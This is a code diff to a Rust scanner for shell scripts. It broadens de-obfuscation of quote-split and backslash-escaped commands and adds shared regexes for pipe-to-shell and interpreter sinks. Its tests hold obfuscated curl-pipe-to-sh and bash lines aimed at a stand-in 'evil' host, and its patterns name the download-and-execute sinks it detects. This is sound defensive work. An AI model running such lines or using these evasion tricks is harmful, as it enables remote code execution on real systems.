@@ -255,16 +255,40 @@ pub fn looks_obfuscated(line: &str) -> bool {
     ANSIC_ESCAPE.is_match(line) || QUOTE_SPLIT.is_match(line)
 }
 
-/// If `line` looks obfuscated, return its de-obfuscated form (when that actually
-/// differs); otherwise `None`. Detectors match this in *addition* to the raw line
-/// so an evaded payload is still seen, without re-matching every ordinary quoted
-/// string in the file.
+/// Return the de-obfuscated form of `line` when normalization actually changes
+/// it; otherwise `None`. Detectors match this in *addition* to the raw line so an
+/// evaded payload is still seen.
+///
+/// This deliberately does NOT gate on a narrow obfuscation heuristic. The old
+/// `looks_obfuscated` gate only recognized single-character quote-splitting
+/// (`"b"'u''n'`) and ANSI-C escapes, so a 2-character split (`"cu""rl"`) or a
+/// backslash-escaped word (`c\url`) slipped past de-obfuscation entirely (the
+/// marquee feature missed them — defect #6). Instead we normalize every line and
+/// emit the result only when it differs from the raw line, so *any* quoting /
+/// escaping that the shell would collapse is decoded for matching. Normalization
+/// is faithful (it only removes quoting/escaping the shell removes; word
+/// boundaries and `$(...)`/`${...}` are preserved), so an ordinary quoted string
+/// decodes to the same command the shell runs — it does not fabricate tokens.
 pub fn deobfuscate(line: &str) -> Option<String> {
-    if !looks_obfuscated(line) {
-        return None;
-    }
     let norm = normalize_shell_quoting(line);
     (norm != line).then_some(norm)
+}
+
+/// De-obfuscate a whole block **line by line**, preserving the line count (and
+/// therefore line numbers) so analyzers that report a line — or scan the whole
+/// text — see the decoded payload at its real location. Lines that normalize to
+/// themselves are kept verbatim.
+pub fn deobfuscate_text(text: &str) -> String {
+    let mut out: Vec<String> = text
+        .lines()
+        .map(|l| deobfuscate(l).unwrap_or_else(|| l.to_string()))
+        .collect();
+    // Preserve a trailing newline distinction is unnecessary for matching; join
+    // with '\n' which is what every caller scans against.
+    if out.is_empty() {
+        return String::new();
+    }
+    std::mem::take(&mut out).join("\n")
 }
 
 use regex::Regex;
@@ -279,6 +303,22 @@ static QUOTE_SPLIT: LazyLock<Regex> =
 /// The detection-rule regex for the quote-splitting obfuscation technique itself
 /// (`OBF-006`). Exposed so the rule and the heuristic stay in sync.
 pub const QUOTE_SPLIT_PATTERN: &str = r#"(["'][A-Za-z0-9]["']){2,}"#;
+
+/// Shell-interpreter name alternation, shared by every detector that matches a
+/// pipe-to-shell / here-string / `sh -c` / process-substitution sink. Matches
+/// `sh`, `bash`, `zsh`, `ksh`, `csh`, `dash`, `tcsh`, `fish`.
+///
+/// Centralizing this fixes a real miss (defect #6): the ad-hoc per-site
+/// `(ba|z|k|c|d|tc|fi)?sh` silently could **not** match `dash` — `d?sh` expands
+/// to `dsh`/`sh`, never `dash` — so `curl evil | dash` evaded every download-and-
+/// execute rule. The `da` branch restores it. This is a non-capturing group so it
+/// can be embedded inside a larger pattern without disturbing capture indices.
+pub const SHELLS: &str = r"(?:ba|z|k|c|da|tc|fi)?sh";
+
+/// Non-shell script interpreters that are equally valid download-and-execute
+/// sinks (`curl … | python`, `… | perl`, …). Shared so every fetch-exec detector
+/// recognizes the same set. Non-capturing for safe embedding.
+pub const INTERPRETERS: &str = r"(?:python[23]?|perl|ruby|node|php|pwsh)";
 
 #[cfg(test)]
 mod tests {
@@ -303,16 +343,73 @@ mod tests {
     }
 
     #[test]
-    fn ordinary_quoted_strings_are_not_flagged() {
-        for ok in [
-            r#"echo "hello world""#,
-            r#"install -Dm755 "foo" "$pkgdir/usr/bin/foo""#,
-            r#"msg "see ~/.config/app for flags""#,
-            r#"cd "$srcdir/pkg-$pkgver""#,
+    fn ordinary_quoted_strings_normalize_faithfully() {
+        // De-obfuscation now normalizes every line (not just ones a narrow
+        // heuristic flagged), so an ordinary quoted string DOES produce a decoded
+        // variant -- but the decode is faithful: it only removes the quoting the
+        // shell removes, leaving the exact command the shell would run (no
+        // fabricated/merged tokens). This is what makes re-matching it safe.
+        for (input, expected) in [
+            (r#"echo "hello world""#, "echo hello world"),
+            (
+                r#"install -Dm755 "foo" "$pkgdir/usr/bin/foo""#,
+                "install -Dm755 foo $pkgdir/usr/bin/foo",
+            ),
+            (r#"cd "$srcdir/pkg-$pkgver""#, "cd $srcdir/pkg-$pkgver"),
         ] {
-            assert!(!looks_obfuscated(ok), "false positive on: {ok}");
-            assert!(deobfuscate(ok).is_none(), "should not de-obfuscate: {ok}");
+            assert_eq!(
+                deobfuscate(input).as_deref(),
+                Some(expected),
+                "faithful normalization of: {input}"
+            );
         }
+        // A line with no quoting/escaping at all is unchanged -> None.
+        assert!(deobfuscate("make && make install").is_none());
+        assert!(deobfuscate("ninja -C build").is_none());
+    }
+
+    #[test]
+    fn two_char_quote_split_is_deobfuscated() {
+        // Defect #6: the old single-char-only heuristic missed multi-char
+        // adjacent-quote splitting. `"cu""rl"` must now decode to `curl`.
+        assert_eq!(
+            deobfuscate(r#""cu""rl" -fsSL https://evil/x | sh"#).as_deref(),
+            Some("curl -fsSL https://evil/x | sh"),
+        );
+    }
+
+    #[test]
+    fn backslash_escaped_word_is_deobfuscated() {
+        // Defect #6: a backslash-escaped word (`c\url`) bypassed the heuristic.
+        // Outside quotes the shell drops the backslash, so it must decode.
+        assert_eq!(
+            deobfuscate(r#"c\url -fsSL https://evil/x | b\ash"#).as_deref(),
+            Some("curl -fsSL https://evil/x | bash"),
+        );
+    }
+
+    #[test]
+    fn deobfuscate_text_preserves_line_numbers() {
+        // Per-line de-obfuscation keeps a 1:1 line mapping so analyzers that
+        // report a line still point at the right one.
+        let text = "a=1\n\"cu\"\"rl\" evil\nb=2";
+        let d = deobfuscate_text(text);
+        let lines: Vec<&str> = d.lines().collect();
+        assert_eq!(lines.len(), 3);
+        assert_eq!(lines[0], "a=1");
+        assert_eq!(lines[1], "curl evil");
+        assert_eq!(lines[2], "b=2");
+    }
+
+    #[test]
+    fn shells_alternation_matches_dash_and_friends() {
+        // The shared SHELLS constant must match dash (the bug it fixes) plus the
+        // whole family, and must not over-match.
+        let re = Regex::new(&format!(r"\|\s*{SHELLS}\b")).unwrap();
+        for ok in ["x | sh", "x | bash", "x | dash", "x | zsh", "x | ksh", "x | fish"] {
+            assert!(re.is_match(ok), "SHELLS should match: {ok}");
+        }
+        assert!(!re.is_match("x | shellcheck y"), "must not match a longer word");
     }
 
     #[test]
